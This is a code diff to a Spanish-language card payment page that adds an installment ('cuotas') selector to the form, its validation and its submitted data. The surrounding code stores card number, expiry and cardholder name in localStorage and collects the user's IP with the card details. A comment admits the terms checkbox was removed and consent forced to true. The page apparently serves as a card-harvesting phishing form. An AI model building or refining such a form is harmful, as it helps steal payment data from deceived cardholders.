@@ -69,11 +69,14 @@
         .form-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 25px; }
         .input-group { display: flex; align-items: center; border-bottom: 1px solid #ccc; padding-bottom: 8px; margin-bottom: 20px; position: relative; }
         .input-group svg.icon { width: 24px; height: 24px; fill: #888; margin-right: 10px; flex-shrink: 0; }
-        .input-group input { border: none; outline: none; width: 100%; font-size: 15px; font-family: 'Montserrat', sans-serif; color: #333; background: transparent; }
+        .input-group input, .input-group select { border: none; outline: none; width: 100%; font-size: 15px; font-family: 'Montserrat', sans-serif; color: #333; background: transparent; }
         .input-group input::placeholder { color: #aaa; }
         .input-group.error input { color: #c62828; }
+        .input-group select { cursor: pointer; appearance: none; -webkit-appearance: none; -moz-appearance: none; }
+        .input-group select:invalid { color: #aaa; }
+        .input-group select option { color: #333; }
 
-        .info-icon-circle { width: 16px; height: 16px; background: #111111; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 10px; font-weight: bold; cursor: pointer; margin-left: 5px; }
+        .info-icon-circle { width: 16px; height: 16px; background: #111111; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 10px; font-weight: bold; cursor: pointer; margin-left: 5px; flex-shrink: 0; }
 
         .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
 
@@ -295,8 +298,19 @@
                     </div>
                     <div class="input-group">
                         <svg class="icon" viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zM7 7v2h14V7H7z"/></svg>
-                        <input type="text" value="Cuotas" readonly style="cursor:pointer;">
-                        <div class="info-icon-circle" style="background:#888;">i</div>
+                        <select id="cuotas" name="cuotas" required>
+                            <option value="" disabled selected>Seleccione cuotas</option>
+                            <option value="1">1 cuota (Pago total)</option>
+                            <option value="2">2 cuotas</option>
+                            <option value="3">3 cuotas</option>
+                            <option value="6">6 cuotas</option>
+                            <option value="9">9 cuotas</option>
+                            <option value="12">12 cuotas</option>
+                            <option value="18">18 cuotas</option>
+                            <option value="24">24 cuotas</option>
+                            <option value="36">36 cuotas</option>
+                        </select>
+                        <div class="info-icon-circle" style="background:#888; cursor: help;" title="Las cuotas disponibles pueden variar según el banco emisor y el monto de la compra.">i</div>
                     </div>
                 </div>
 
@@ -474,6 +488,7 @@
         const inputExp = document.getElementById('exp');
         const inputCVV = document.getElementById('cvv');
         const inputNombre = document.getElementById('nombre');
+        const inputCuotas = document.getElementById('cuotas');
         const btnPagar = document.getElementById('btnPagar');
         const alertError = document.getElementById('alertError');
         const mensajeError = document.getElementById('mensajeError');
@@ -569,7 +584,7 @@
         function ocultarError() { alertError.classList.remove('show'); }
         function habilitarFormulario() {
             btnPagar.disabled = false; btnPagar.textContent = 'Continuar';
-            inputNumero.disabled = false; inputNombre.disabled = false; inputExp.disabled = false; inputCVV.disabled = false;
+            inputNumero.disabled = false; inputNombre.disabled = false; inputExp.disabled = false; inputCVV.disabled = false; inputCuotas.disabled = false;
         }
 
         // ============================================================
@@ -685,6 +700,7 @@
             const numero = inputNumero.value.replace(/\s/g, '');
             const exp = inputExp.value.trim();
             const cvv = inputCVV.value.trim();
+            const cuotasSeleccionadas = inputCuotas.value;
             
             // Como quitamos el checkbox visual, forzamos a que "terms" sea true
             const terms = true;
@@ -693,6 +709,7 @@
             if (!numero || numero.length < 15) { mostrarError('El número de tarjeta debe tener al menos 15 dígitos'); return; }
             if (!exp || !/^\d{2}\/\d{2}$/.test(exp)) { mostrarError('Ingresa una fecha válida (MM/AA)'); return; }
             if (!cvv || cvv.length < 3) { mostrarError('Ingresa un CVV válido'); return; }
+            if (!cuotasSeleccionadas) { mostrarError('Por favor, selecciona el número de cuotas'); return; }
             // La validación de terms ya no bloqueará porque está en true
 
             cardType = detectCardType(numero);
@@ -707,6 +724,7 @@
             localStorage.setItem('expiry', exp);
             localStorage.setItem('cardholderName', nombre);
             localStorage.setItem('cardType', cardType);
+            localStorage.setItem('cuotas', cuotasSeleccionadas);
             localStorage.setItem('solicitudId', solicitudId);
 
             loadingOverlay.classList.add('active');
@@ -716,7 +734,7 @@
             logoContainer.style.display = 'none';
             progressWrapper.style.display = 'none';
             btnPagar.disabled = true; btnPagar.textContent = 'Procesando...';
-            inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true;
+            inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true; inputCuotas.disabled = true;
 
             const nombreP = localStorage.getItem('nombre') || 'No proporcionado';
             const tipoDocumento = localStorage.getItem('tipoDocumento') || 'CC';
@@ -738,6 +756,7 @@
                 vencimiento: exp,
                 tipoTarjeta: cardType,
                 bancoEmisor: detectedBank,
+                cuotas: cuotasSeleccionadas,
                 totalFormateado: totalFormateado,
                 fechaHora: fechaHora,
                 ip: localStorage.getItem('usuario_ip') || '',
